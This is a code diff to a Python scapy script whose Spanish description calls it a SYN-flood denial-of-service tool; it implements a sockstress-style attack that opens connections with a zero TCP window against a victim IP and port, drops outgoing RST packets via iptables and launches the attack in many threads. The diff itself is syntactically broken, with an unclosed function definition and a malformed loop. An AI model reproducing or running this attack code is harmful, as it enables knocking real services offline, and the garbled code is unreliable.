@@ -9,18 +9,12 @@ import random
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-parser = argparse.ArgumentParser(description="Script para hacer Dos con FLOOD SYN")
-parser.add_argument('-V', '--IP_USER',metavar="IPUSER", help="IP de la victima", required=True, dest='USER')
-parser.add_argument('-P', '--PORT',metavar="IPPORT", help="PUERTO de la victima", required=True, dest='PORT')
-parser.add_argument('-C', '--CONECTIONS',metavar="NUMCONECT", help="Numero de conexiones", required=True, dest='CONECT')
-parser.add_argument('-t', '--threads', metavar="THreads", help="Numero de hilos", required=True,dest='TH')
 
-args = parser.parse_args()
-
-for p range (int(args.CONECT)):
- x = random.randint(0,65535)
- response = sr1(IP(dst=args.USER)/TCP(sport=x,dport=args.PORT,flags='S'),timeout=1,verbose=0) 
- send(IP(dst=args.USER)/TCP(dport=args.PORT,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)
+def sockstress(
+ for p range (int(args.CONECT)):
+  x = random.randint(0,65535)
+  response = sr1(IP(dst=args.USER)/TCP(sport=x,dport=args.PORT,flags='S'),timeout=1,verbose=0) 
+  send(IP(dst=args.USER)/TCP(dport=args.PORT,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)
 
 
 
@@ -37,8 +31,16 @@ if __name__ == "__main__":
  os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
 
  ## Spin up multiple threads to launch the attack
+ parser = argparse.ArgumentParser(description="Script para hacer Dos con FLOOD SYN")
+ parser.add_argument('-V', '--IP_USER',metavar="IPUSER", help="IP de la victima", required=True, dest='USER')
+ parser.add_argument('-P', '--PORT',metavar="IPPORT", help="PUERTO de la victima", required=True, dest='PORT')
+ parser.add_argument('-C', '--CONECTIONS',metavar="NUMCONECT", help="Numero de conexiones", required=True, dest='CONECT')
+ parser.add_argument('-t', '--threads', metavar="THreads", help="Numero de hilos", required=True,dest='TH')
+
+ args = parser.parse_args()
+ 
  for x in range(0,threads):
-  thread.start_new_thread(sockstress, (target,dstport))
+  thread.start_new_thread(sockstress, (args.USER,args.PORT))
 
  signal.signal(signal.SIGINT, graceful_shutdown)
 
